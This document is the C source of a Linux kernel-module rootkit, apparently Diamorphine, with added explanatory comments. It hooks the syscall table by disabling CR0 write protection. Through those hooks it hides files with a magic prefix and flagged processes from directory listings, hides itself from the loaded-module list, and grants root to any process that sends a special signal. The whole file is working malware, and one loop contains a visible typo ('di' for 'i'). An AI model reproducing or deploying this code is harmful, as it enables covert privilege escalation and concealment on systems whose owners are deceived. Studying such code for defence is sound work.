#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#include "diamorphine.h"

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
// The cr0 register is a control register in x86 architecture that contains various control flags for the CPU, such as enabling or disabling paging, protection levels, and other critical system settings.
unsigned long cr0;
#endif

static unsigned long *__sys_call_table; // pointer to the system call table

/**
 * Declaration of pointers to the original syscall function addresses.
 */
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
/**
 * Since kernel version 4.17.0, the arguments that are first stored in registers by the user
 * now are copied into a special struct called `pt_regs`.
 * And then this is the only thing passed to the syscall. The syscall is then responsible fo pulling
 * the arguments it needs out of this struct.
 */

// Define a new function pointer type t_syscall
typedef asmlinkage long (*t_syscall)(const struct pt_regs *);

// pointers of type t_syscall to store the address of the original sys_calls
static t_syscall orig_getdents;
static t_syscall orig_getdents64;
static t_syscall orig_kill;

#else
/**
 * Arguments are passed to the syscall exactly how it appears to be.
 * Just an exactly imitation of the syscall function declaration.
 */

// Declare the function pointer type for every syscall we want to store
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);

// Declare the pointer to store the address of the original syscall functions with their respective types.
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;
#endif

/**
 * Function that attempts to locate the system call table in the Linux kernel using the KProbe method.
 */
unsigned long *get_syscall_table_bf(void)
{
	// function-wide pointer to hold the address of the system call table
	unsigned long *syscall_table;

// If the kernel version is greater than 4.4, check if the KPROBE_LOOKUP macro is defined. If it is. It uses a kprobe to dynamically resolve the address of the kallsyms_lookup_name function. This function is used to look up the address of kernel symbols by name.
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
	// function pointer type definition for the kallsyms_lookup_name function
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

	// pointer to the kallsyms_lookup_name function
	kallsyms_lookup_name_t kallsyms_lookup_name;

	// register the kprobe (declared in header file) to probe the kallsyms_lookup_name function
	register_kprobe(&kp);

	// assign the address of the kallsyms_lookup_name function to the pointer
	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;

	// unregister the kprobe
	unregister_kprobe(&kp);
#endif
	// look up the address of the sys_call_table symbol using kallsyms_lookup_name
	syscall_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

	// return the address of the system call table
	return syscall_table;
#else

	// If the kernel version is less than 4.4, use a brute force method to locate the system call table.

	// It iterates through the memory addresses starting from the address of the sys_close function up to the maximum unsigned long value. Because the sys_close function is part of the system call table, and its address is known and by starting the search from the address of sys_close, the code begins its search in a region of memory that is likely to be close to the system call table incrementing the chances of finding the table quickly. Incrementing by the size of a pointer (sizeof(void *)). Because the system call table is an array of function pointers and each entry in this table is a pointer to a system call function. By incrementing the size of a pointer the code ensures that it checks every possible address where the system call table could start, respecting the alignment of pointers in memory.

	// For each address, it casts the address to an unsigned long * and checks if the entry at the index __NR_close matches the address of the sys_close function. If a match is found, it returns the address of the system call table. Because the system call table is an array where each index corresponds to a specific system call.The index __NR_close corresponds to the sys_close system call and by checking if the entry at this index matches the address of the sys_close function, the code verifies that it has found the correct system call table.
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX; di += sizeof(void *))
	{
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
#endif
}

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *p = current;

	for_each_process(p)
	{
		if (p->pid == pid)
			return p;
	}

	return NULL;
}

int is_invisible(pid_t pid)
{
	struct task_struct *task;

	if (!pid)
		return 0;

	task = find_task(pid);

	if (!task)
		return 0;

	if (task->flags & PF_INVISIBLE)
		return 1;

	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int)pt_regs->di;
	struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
#endif
	int ret = orig_getdents64(pt_regs), err;
#else
asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);

	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);

	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret)
	{
		dir = (void *)kdirent + off;
		if ((!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
		{
			if (dir == kdirent)
			{
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}

			prev->d_reclen += dir->d_reclen;
		}
		else
			prev = dir;

		off += dir->d_reclen;
	}

	err = copy_to_user(dirent, kdirent, ret);

	if (err)
		goto out;

out:
	kfree(kdirent);
	return ret;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int)pt_regs->di;
	struct linux_dirent *dirent = (struct linux_dirent *)pt_regs->si;
#endif
	int ret = orig_getdents(pt_regs), err;
#else
asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
#endif
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);

	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);

	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret)
	{
		dir = (void *)kdirent + off;
		if ((!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
		{
			if (dir == kdirent)
			{
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}

			prev->d_reclen += dir->d_reclen;
		}
		else
			prev = dir;

		off += dir->d_reclen;
	}

	err = copy_to_user(dirent, kdirent, ret);

	if (err)
		goto out;

out:
	kfree(kdirent);
	return ret;
}

void give_root(void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
	current->uid = current->gid = 0;
	current->euid = current->egid = 0;
	current->suid = current->sgid = 0;
	current->fsuid = current->fsgid = 0;
#else
	struct cred *newcreds;

	newcreds = prepare_creds();

	if (newcreds == NULL)
		return;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
	newcreds->uid.val = newcreds->gid.val = 0;
	newcreds->euid.val = newcreds->egid.val = 0;
	newcreds->suid.val = newcreds->sgid.val = 0;
	newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
	newcreds->uid = newcreds->gid = 0;
	newcreds->euid = newcreds->egid = 0;
	newcreds->suid = newcreds->sgid = 0;
	newcreds->fsuid = newcreds->fsgid = 0;
#endif

	commit_creds(newcreds);

#endif
}

/**
 * Function to free memory allocated by the module.
 */
static inline void tidy(void)
{
	//  kfree is a function used in the Linux kernel to free memory that was previously allocated.
	kfree(THIS_MODULE->sect_attrs);

	// common practice after freeing memory to avoid dangling pointers, which can lead to undefined behavior if the pointer is dereferenced after the memory has been freed.
	THIS_MODULE->sect_attrs = NULL;
}

// Declaration of a pointer to the previous module in the linked list of loaded kernel modules.
static struct list_head *module_previous;
// flag to indicate if the module is hidden or not.
static short module_hidden = 0;

void module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

/**
 * Function to hide the kernel module by removing it from the kernel's list of loaded modules. (lsmod)
 */
void module_hide(void)
{
	// Saves the previous module in the linked list of modules.
	// THIS_MODULE is a macro that points to the module structure of the current module (this, the shit i'm writing and reading). THIS_MODULE->list accesses the list node that represents the module in the linked list of modules. THIS_MODULE->list.prev points to the previous module in the list.
	// The code saves the address of the previous module in the module_previous variable for later use in restoring the module's position in the list.
	module_previous = THIS_MODULE->list.prev;

	// Removes the current module from the linked list of modules. The list_del function takes a pointer to the list node to be removed. By passing &THIS_MODULE->list, the function unlinks the current module from the list of modules.
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	pid_t pid = (pid_t)pt_regs->di;
	int sig = (int)pt_regs->si;
#endif
#else
asmlinkage int hacked_kill(pid_t pid, int sig)
{
#endif
	struct task_struct *task;

	switch (sig)
	{
	case SIGINVIS:
		if ((task = find_task(pid)) == NULL)
			return -ESRCH;
		task->flags ^= PF_INVISIBLE;
		break;

	case SIGSUPER:
		give_root();
		break;

	case SIGMODINVIS:
		if (module_hidden)
			module_show();
		else
			module_hide();
		break;

	default:
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
		return orig_kill(pt_regs);
#else
		return orig_kill(pid, sig);
#endif
	}
	return 0;
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}
#endif

static inline void protect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0);
#else
	write_cr0(cr0);
#endif
#endif
}

static inline void unprotect_memory(void)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	write_cr0_forced(cr0 & ~0x00010000);
#else
	write_cr0(cr0 & ~0x00010000);
#endif
#endif
}

// START POINT!!!
static int __init diamorphine_init(void)
{
	// get the address of the system call table and stores it in the pointer declared previously.
	__sys_call_table = get_syscall_table_bf();

	if (!__sys_call_table)
		return -1;

		// cr0 assignation
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	// reads the value of the cr0 register by calling the read_cr0() function and assigns it to the variable cr0. The cr0 register is a control register in x86 architecture that contains various control flags for the CPU, such as enabling or disabling paging, protection levels, and other critical system settings.
	cr0 = read_cr0();
#endif

	// hides the module from the kernel's list of loaded modules
	module_hide();

	// frees the memory allocated by the module
	tidy();

// Stores the original addresses of the system calls in the pointers declared previously.
// The __NR_ prefix refers to constants that represent system call numbers in the Linux kernel.
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
#else
	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
#endif

	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;

	protect_memory();

	return 0;
}

static void __exit diamorphine_cleanup(void)
{
	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;

	protect_memory();
}

// Calls the init function, where the execution starts.
module_init(diamorphine_init);

// Calls the exit function.
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("x");
MODULE_DESCRIPTION("LKM");
